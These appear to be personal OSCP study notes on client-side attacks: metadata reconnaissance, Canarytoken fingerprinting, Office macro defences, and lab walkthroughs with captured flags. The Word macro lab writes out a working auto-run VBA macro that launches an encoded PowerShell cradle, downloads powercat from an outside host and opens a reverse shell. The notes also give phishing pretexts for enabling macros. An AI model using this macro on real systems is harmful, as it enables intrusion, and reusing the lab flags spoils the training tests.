# Module 12: Client-Side Attacks

## Tags
#OSCP #Module12 #ClientSideAttacks #SocialEngineering #Reconnaissance #MetadataAnalysis

---

## **Why This Module Matters**
Straight-up exploiting an exposed service to breach a perimeter has gotten harder and rarer, Verizon's own breach report ranks phishing as the #2 attack vector, right behind credential attacks. Client-side attacks are the technical half of that story: get a malicious file in front of a user, get them to open it, land a foothold on a machine that (unlike a public-facing server) was never designed to be reachable from outside at all.

The core idea: client machines inside an org almost never expose services externally, so you can't port-scan your way in. Instead you exploit weaknesses in whatever software the *user* runs locally (browser, OS components, Office), and you need the user to cooperate (even unknowingly) to trigger it. That makes this as much a psychology problem as a technical one, matching everything covered in [[Phishing Basics]] about pretext and trust, just paired with a different payload category here (documents and library files instead of cloned login pages).

**Worth sitting with for a second:** this module explicitly calls out the ethical line, the goal is code execution, not blackmail, not impersonating law enforcement, not psychologically harming anyone. Same spirit as the "do not target" list mentioned in [[Phishing Basics#11.1.1. Email Phishing|11.1.1]], real engagements have real boundaries.

This module covers target reconnaissance for client-side attacks (12.1), exploiting Microsoft Office (12.2), and abusing Windows Library files (12.3).

**⚠️ Status:** 12.1 fully done. 12.2.1 done (theory + all 3 quiz answers). 12.2.2 done (Office installed, program list confirmed). 12.2.3 Lab 1 done (macro → reverse shell confirmed on OFFICE). 12.2.3 Lab 2 (deliver to TICKETS, catch Administrator shell) **blocked**, OFFICE VM instance broke mid-rebuild (state reset + Office reinstall silently failing with zero diagnostic trace), needs a VM revert to resume, full troubleshooting trail logged in the Lab 2 section below. Rest of the module (12.3) still to come.

---

## 12.1. Target Reconnaissance

### 12.1.1. Information Gathering

**The core constraint:** unlike normal network recon, you usually have no direct connection to a client-side attack's actual target (a specific employee's workstation). So you're forced into more indirect, creative info-gathering, and a genuinely nice side effect is that a lot of these techniques are completely passive: no packets ever touch the target, no logs, no alerts.

**Document metadata is the headline technique here.** Public documents (PDFs, Office files) an organization has posted online often carry metadata that was never scrubbed: author name, creation/modification dates, and critically, the exact software (and often OS) used to create the file. None of this requires touching the target's network at all, just downloading something they already published.

**Finding the documents:**
- Google dorking: `site:example.com filetype:pdf` (narrow further with keywords for a specific branch/location), reusing the dorking technique from [[Information Gathering]] (Module 6)
- `gobuster` with `-x pdf` (or whatever extension) against the target's own site, works but is noisy, it'll show up in the target's access logs unlike the passive Google-dork approach
- Just browsing the site by hand and looking for anything downloadable

**Reading the metadata with `exiftool`:**
```bash
exiftool -a -u brochure.pdf
```
`-a` shows duplicate tags (the same info sometimes appears under multiple tag names), `-u` shows "unknown" tags exiftool doesn't have a friendly label for but still extracts.

**What actually matters in the output:**
- **Create Date / Modify Date**: tells you how *current* this intel actually is. A document from last month is a much better signal than one from five years ago, software changes, people change roles, whole departments get re-imaged onto new systems.
- **Author**: a real name at the target org. Beyond just being a research thread to pull on, casually referencing someone's name in a pretext (an email, a phone call) is a small but real trust-builder, "I was just talking to Stanley about this" lands very differently than a cold approach.
- **Producer / Creator Tool**: this is the big one for planning an actual payload. `Microsoft® PowerPoint® for Microsoft 365` tells you Office is installed, no "for Mac" or "macOS" mentioned anywhere in the tags is a solid (not certain) signal the creating machine was Windows.

That combination (Office installed, likely Windows) is exactly the intel that decides which client-side attack vector makes sense next: JScript via Windows Script Host, malicious `.lnk` shortcut files, or Office macro documents, all covered later in this module.

**Worth remembering: this is a hands-off, best-effort technique, not a certainty.** The trade-off for staying invisible is that the intel might be stale, or a different branch of the org might run completely different software. Treat it as a strong lead, not a confirmed fact.


> 📋 Generalized copy-pasteable commands: [[Reconnaissance & Enumeration#Exiftool (Document Metadata Analysis)|Command Appendix]]
> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]

#### Tags: #MetadataAnalysis #Exiftool #GoogleDorking #PassiveRecon #OSINT

---

## Labs

### Lab 1 (VM #1): `old.pdf` metadata
> 🔧 Technique: the site's own download buttons (Single Page Application) turned out unreliable, brute forced for PDF files directly instead of fighting the UI.

Target: `192.168.170.197`.

**Step 1: Brute force for PDF files instead of using the site's buttons**
```bash
gobuster dir -u http://192.168.170.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf -t 50
```
Found three PDFs: `brochure.pdf`, `info.pdf` (not mentioned anywhere in the module text), and `old.pdf`.
![[Pasted image 20260804221920.png]]
**Step 2: Grab and inspect `old.pdf`**
```bash
wget http://192.168.170.197/old.pdf
exiftool -a -u old.pdf
```
`Author` tag directly contains the flag (this one didn't need interpreting, unlike `brochure.pdf`'s "infer the OS/Office version" exercise in the module's own walkthrough). Also worth noting the `Producer` tag here: `macOS Version 12.3.1 (Build 21E258) Quartz PDFContext`, unlike `brochure.pdf`'s Windows/Microsoft 365 producer string, a good concrete example of the module's point that different documents (or branches of an org) can reveal different source machines.

**Lab answer:** **`OS{cc0f095a0c6485124055b709de810660}`**

![[Pasted image 20260804222011.png]]

#### Tags: #Lab #Quiz #Module12 #Exiftool #Gobuster

---

### Lab 2 (VM #2): flag in a third PDF's metadata
> 🔧 Technique: same site, same gobuster approach, this time the flag sits in a different metadata field entirely.

Target: `192.168.170.197` (same IP as VM #1 this time).

```bash
gobuster dir -u http://192.168.170.197/ -w /usr/share/wordlists/dirb/common.txt -x pdf -t 50
wget http://192.168.170.197/info.pdf
exiftool -a -u info.pdf
```
Flag was in the **`Description`** tag this time, not `Author` (where it sat for `old.pdf` in Lab 1). Worth remembering: don't assume the flag/interesting data always lands in the same field, `exiftool -a -u` dumping everything (including "unknown" tags) is exactly why that's the right default, rather than grepping for one specific tag name upfront.

Side note while re-pulling `brochure.pdf` here: `Language` showed as `de-DE` (German) this run, vs. `en-US` in the module's own walkthrough example, same file/producer otherwise, a small reminder that even "the same" lab asset can vary slightly instance to instance.

**Lab answer:** **`OS{545c2f90e45496106cea49766bc7538c}`**

#### Tags: #Lab #Quiz #Module12 #Exiftool #Gobuster

---

### 12.1.2. Client Fingerprinting

Metadata analysis (12.1.1) is entirely passive but also a bit of a guess, it tells you what created a document once, not what the target is running *right now*. Client fingerprinting closes that gap: get the target to interact with something you control, and their browser hands you live OS/browser info directly.

**Worked example scenario:** you've already got a target's email (say, via theHarvester from [[Information Gathering]]). The end goal is an HTA (HTML Application) attachment, a genuinely popular real-world foothold technique (threat actors and ransomware groups use it too, not just pentesters) that executes code in the context of Internet Explorer/Edge. But that only works if the target is actually on **Windows** with IE/Edge available, so confirming that *before* sending a payload that only works on the right platform is the whole point of this section.

**The tool: Canarytokens** (canarytokens.org), a free service that generates a tracking link. When a target opens it, you get their IP, browser, and OS, no payload delivered, no code execution, just a blank page and a logged visit.

**Pretext still matters here, same as always.** You can't just send a stranger a bare tracking link and expect a click. The module's example: pretend to be following up about an invoice with a supposed error, and offer a "screenshot showing the error" (which is actually the Canarytoken link). Framed around something specific to the target's actual job (finance department, an invoice) rather than a generic "click this" ask.

**Building and reading a Canarytoken:**
1. On canarytokens.org, pick **Web bug / URL token** from the dropdown, provide an email (or webhook) for alerts, add a comment for your own reference, generate it.
2. You get a tracking link plus a **Manage this token** page (settings) and a **History** page (visitor log, empty until someone clicks).
3. Once "the victim" opens the link: blank page on their end, a new entry appears in your History almost immediately, complete with a rough geographic location on a map.
4. Click into an entry for the full detail: **User-Agent string** (self-reported by the browser, tells you OS/browser, but spoofable, don't fully trust it alone) plus **JavaScript-fingerprinting-derived info** (collected by JS running on the Canarytoken page itself, meaningfully more reliable since it's actively probing the browser's real environment rather than just reading a header the browser chose to send).
5. Downloadable as CSV or JSON if you want it outside the dashboard.

**Other Canarytokens flavors worth knowing exist:** embed a token in a Word doc or PDF (fires when opened, not just when a link is clicked) or an image (fires when viewed). Alternatives to Canarytokens entirely: **Grabify** (another IP logger) or **fingerprint.js** (a JS fingerprinting library you could self-host if you wanted more control than a third-party service gives you).

**The payoff, and why this step can redirect your whole plan:** in the module's own example, the fingerprint comes back as Chrome on macOS, not Windows/IE/Edge at all. That's not a failure, that's the recon step doing its job: now you know the HTA-via-IE plan won't work on this specific target, and you either pick a different client-side vector entirely or adjust the pretext (e.g. claim the screenshot "only renders correctly in Internet Explorer" to nudge them toward opening it in the browser you actually need).

![[Pasted image 20260804222923.png]]
![[Pasted image 20260804223329.png]]
![[Pasted image 20260804223704.png]]
![[Pasted image 20260804223939.png]]
![[Pasted image 20260804224005.png]]

> 📋 Generalized reference: [[Reconnaissance & Enumeration#Canarytokens (Client Fingerprinting)|Command Appendix]]
> 🧭 Quick lookup: [[Reconnaissance & Enumeration (Decision Tree)|Decision Tree]]

#### Tags: #ClientFingerprinting #Canarytokens #DeviceFingerprinting #UserAgent #PretextBuilding

---

## 12.2. Exploiting Microsoft Office

Ransomware's initial breach is very often a malicious Office macro, Office is everywhere and Office documents fly between colleagues constantly, which is exactly why it's stayed a top attack vector for so long.

### 12.2.1. Preparing the Attack

**Three things to think through before building the actual malicious document:**

**1. Delivery method.** Malicious macros are well-known enough that a lot of email providers/spam filters just strip Office attachments outright, and most anti-phishing training specifically warns people about enabling macros in emailed documents. So a direct email attachment is often a dead end, a pretext pointing to a download link (matching everything in [[Phishing Basics]]) is frequently the more workable path.

**2. Mark of the Web + Protected View.** Any document that made it to the target via email or a download carries **MOTW** (same NTFS-attribute mechanism covered conceptually in [[Phishing Basics#11.2.2. Identifying Risks of Malicious Office Macros|11.2.2]] for other file types). A MOTW-tagged Office doc opens in **Protected View**: read-only, no macros, no embedded objects, until the user clicks **Enable Editing**. So the pretext has to specifically sell that click, e.g. blurring the rest of the document and instructing the target to click the button to "unlock" it. Alternative: target a macro-capable Office app that doesn't have Protected View at all, like Publisher, though it's installed far less often than Word/Excel.

**3. Microsoft's macro-blocking-by-default change.** Rolled out across Office 2013 through 2021 (exact timing varies by update channel, per Microsoft Learn). Before: a MOTW document with macros showed an **Enable Content** button, one click and you're running code. After: that button is gone, replaced with a **Learn More** link pointing to a Microsoft page explaining the danger, and the *only* way to actually run the macro is to manually open the file's Properties and tick **Unblock**. Meaningfully more friction, the pretext now has to walk the target through that specific multi-step process, not just "click here."

**The bigger picture, worth sitting with:** every one of these mitigations exists because macros work well enough that Microsoft had to keep responding. That's the attacker/defender arms race in miniature, each new control is something to route around, not a wall that ends the technique. Macro-based attacks are still genuinely common today despite all three of the above.

![[Pasted image 20260804224925.png]]

![[Pasted image 20260804224949.png]]

**Lab status: ✅ Completed:**

| Question | Answer |
|---|---|
| True or false: MOTW is not added to files on FAT32-formatted devices. | **True.** MOTW is implemented as an NTFS Alternate Data Stream (`Zone.Identifier`), and FAT32 doesn't support Alternate Data Streams at all, there's no mechanism for the tag to attach to in the first place. |
| True or false: after Microsoft's default-macro-blocking change, users can still execute macros with a single click. | **False.** Per 12.2.1 above, the one-click **Enable Content** button is gone for internet-delivered files, replaced by a **Learn More** link, actually running the macro now requires manually unblocking the file via its Properties dialog first. |
| True or false: it's possible to avoid a MOTW flag by delivering the payload in a container format (7zip, ISO, IMG), and real threat actors use this. | **True**, on both counts, verified via [MITRE ATT&CK T1553.005](https://attack.mitre.org/techniques/T1553/005/) and [Red Canary's Threat Detection Report](https://redcanary.com/threat-detection-report/techniques/mark-of-the-web-bypass/). ISO/IMG/VHD formats don't use NTFS internally, so the MOTW Alternate Data Stream has nothing to propagate onto for files extracted/mounted from them. Real, heavily documented technique: APT29 has embedded ISO/VHDX in HTML attachments, TA505 has delivered `.lnk` files inside `.iso` containers, QakBot operators packaged malware in ISO files to support Black Basta ransomware campaigns. **Caveat worth flagging:** Microsoft has since patched this specifically for ISO files (MOTW now propagates correctly from mounted ISOs on patched systems), so treat this as "historically true and still relevant for other container formats / unpatched systems," not "universally true forever," always verify current patch behavior against the actual target's Windows build rather than assuming. |

#### Tags: #MOTW #ProtectedView #MacroBlocking #Lab #Quiz #Module12

---

### 12.2.2. Installing Microsoft Office
> 🔧 Technique: RDP into a non-domain-joined Windows 11 box with `xfreerdp` (not `rdesktop`, NLA requires it), mount and run the Office 2019 installer, work through first-launch popups.

Target: `192.168.170.196`, `offsec`/`lab`.

**Step 1: RDP in**
```bash
xfreerdp /v:192.168.170.196 /u:offsec /p:lab /dynamic-resolution
```
`rdesktop` won't connect here, OFFICE is not domain-joined and Windows 11 has Network Level Authentication (NLA) on by default, `xfreerdp` supports NLA against non-domain-joined machines, `rdesktop` doesn't.

**Step 2: Install Office**
Mounted `C:\tools\Office2019.img` as a virtual CD (double-click → Open), ran `Setup.exe` from the mounted drive. Once installed: closed the splash screen, opened Word, dismissed the product key popup (X, starts the 7-day trial instead of activating), accepted the license agreement, declined optional data sharing in the privacy prompt.
![[Pasted image 20260804225745.png]]

**Step 3: Confirm installed programs**
Checked the Start menu for the full Office 2019 program list: Word, Excel, Outlook, PowerPoint, Publisher, Access, OneNote, plus two non-app utilities (Get Help, Office Language Preferences) that don't count as standalone programs.

**Lab answer:** **OneNote**

---

### 12.2.3. Leveraging Microsoft Word Macros

#### Lab 1 (VM #1, OFFICE): macro → reverse shell
> 🔧 Technique: VBA macro using `CreateObject("Wscript.Shell").Run` to launch a base64-encoded (UTF-16LE) PowerShell download cradle for PowerCat, split into ≤255-character chunks (VBA's literal string length limit) concatenated into a `Str` variable.

**Step 1: Basic proof-of-concept macro**

Created `mymacro.doc` (must be `.doc` or `.docm`, **not** `.docx`, which can run a macro in-session but can't persist/embed one in the saved file). Built the macro via **View → Macros**, name `MyMacro`, "Macros in" set to the document itself (not the global template, or it won't travel with the file):
```vba
Sub AutoOpen()
  MyMacro
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub MyMacro()
  CreateObject("Wscript.Shell").Run "powershell"
End Sub
```
`AutoOpen`/`Document_Open` both call the macro since they cover slightly different document-opening scenarios, using both is the safe default. Saved, closed, reopened, clicked **Enable Content** on the security warning, confirmed a PowerShell window popped up.

**Step 2: Full reverse shell payload**

Hosted `powercat.ps1` from `~` via `python3 -m http.server 80`, started `nc -nvlp 4444`. Built and base64-encoded (UTF-16LE, same requirement as [[Common Web Application Attacks#9.3.1. Using Executable Files|9.3.1]]'s PowerShell reverse shell) the download cradle via `pwsh`:
```powershell
$Text = 'IEX(New-Object System.Net.WebClient).DownloadString(''http://192.168.45.212/powercat.ps1'');powercat -c 192.168.45.212 -p 4444 -e powershell'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
```
Split into 50-character chunks (a small Python one-liner loop) since VBA can't hold the whole base64 string as one literal, then dropped into the macro:
```vba
Sub AutoOpen()
    MyMacro
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub MyMacro()
    Dim Str As String

    Str = Str + "powershell.exe -nop -w hidden -enc SQBFAFgAKABOAGU"
    Str = Str + "AdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAd"
    Str = Str + "AAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwB"
    Str = Str + "hAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5A"
    Str = Str + "DIALgAxADYAOAAuADQANQAuADIAMQAyAC8AcABvAHcAZQByAGM"
    Str = Str + "AYQB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAAL"
    Str = Str + "QBjACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMQAyACAALQB"
    Str = Str + "wACAANAA0ADQANAAgAC0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsA"
    Str = Str + "GwA"

    CreateObject("Wscript.Shell").Run Str
End Sub
```
Saved, closed, reopened, no re-prompt this time (only re-prompts if the filename changes), macro fired automatically. Web server logged the `GET /powercat.ps1`, listener caught the reverse shell.
![[Pasted image 20260804232757.png]]

**Question:** what keyword declares a variable in VBA?

**Lab answer:** **`Dim`**

#### Tags: #Lab #Quiz #Module12 #VBA #WordMacros #PowerCat #ReverseShell

---

#### Lab 2 (VM #2, TICKETS): delivering the macro to a simulated user
> 🔧 Technique: in progress, currently blocked on a broken OFFICE VM instance, needs a revert before continuing. Full plan and troubleshooting trail below for picking back up.

**The plan (not yet executed to completion):**
1. Rebuild the macro on OFFICE (VM #1, `192.168.170.196`), same VBA payload as Lab 1
2. Copy the resulting `.doc` off the VM via an RDP redirected drive: `xfreerdp /v:192.168.170.196 /u:offsec /p:lab /dynamic-resolution /drive:kali,/home/kali` (maps `/home/kali` as a network drive inside the session)
3. Rename it to `ticket.doc`, upload to TICKETS (VM #2, `192.168.170.198`) via `curl -F "myFile=@ticket.doc" http://tickets.com:8000/upload` (form field confirmed via `curl -s http://tickets.com:8000/ | grep -iE "<form|<input|action="`, needs `192.168.170.198 tickets.com` in `/etc/hosts`)
4. Wait up to ~3 minutes for the simulated-user script to open it, catch a reverse shell as Administrator, read the flag from the desktop's `flag.txt`

> **🛠️ Troubleshooting saga hit this session, VM state got wiped mid-work:**
> - **First surprise:** reconnected to OFFICE (192.168.170.196) via a second `xfreerdp` session (this one with `/drive:kali,/home/kali` added) expecting to find `mymacro.doc` from Lab 1 still there. Instead: no `.doc` anywhere in the profile, and **Office itself wasn't installed anymore**. The VM instance had reset to blank state between the two RDP connections, all of Lab 1's on-target work was gone (the reverse shell we already caught and logged is still valid, the *document itself* just doesn't exist on disk anymore).
> - **Second surprise, reinstall attempt failed differently:** `C:\tools\Office2019.img` was still present, mounted fine via `Mount-DiskImage`, `D:\Setup.exe` existed and launched (confirmed via `tasklist`), but exited almost immediately with **exit code 1** and **zero diagnostic trace**: no visible installer window, no Windows Defender detection (`Get-MpThreatDetection` empty), no temp files, no Click-to-Run log directory even created, running from an elevated (Run as Administrator) prompt didn't change anything.
> - **Read on the "zero trace" symptom:** a real install failure (bad media, missing dependency, permissions) almost always leaves *something* behind, a log, a Defender event, a partial temp file. Getting literally nothing after a process launches and dies suggests the VM instance itself is broken, not a fixable config/permissions issue on our end. Same underlying judgment call as the Nessus "0 hosts / 0 vulnerabilities → suspect the lab instance, not your scan config" entry already in [[Reconnaissance & Enumeration (Decision Tree)]].
> - **Next step when resuming:** revert/restart the OFFICE VM instance from the lab control panel before attempting the install again, rather than continuing to debug a phantom failure on a likely-corrupted instance.

**Lab answer:** Pending — full chain still needs: OFFICE VM revert → reinstall Office → rebuild macro → copy off via redirected drive → upload to TICKETS → catch shell → read flag.

---

## Labs (continued)

### Lab 3: AdBlocker's effect on fingerprinting accuracy
> 🔧 Technique: created a Web bug / URL Canarytoken, opened the link twice (AdBlocker on, then off), compared the History entries.

**Question:** true or false, there's no difference in the results between AdBlocker enabled vs disabled?

**Lab answer:** **False** — there IS a difference. Makes sense given how the detailed fingerprint data actually gets collected: the *reliable* half of a Canarytoken's info (the part beyond the raw, spoofable User-Agent string) comes from **JavaScript actively running in the browser** to probe its real environment. AdBlockers commonly block tracking/fingerprinting scripts as part of their normal job, so with one enabled, that JS either doesn't run at all or gets a reduced picture, giving a thinner/different result than the same link opened with no blocker in the way.

**Practical takeaway for a real engagement:** a target running an AdBlocker (increasingly common) may give you a less complete fingerprint than expected, worth keeping in mind before fully trusting a single fingerprinting pass, especially if the result looks suspiciously sparse.
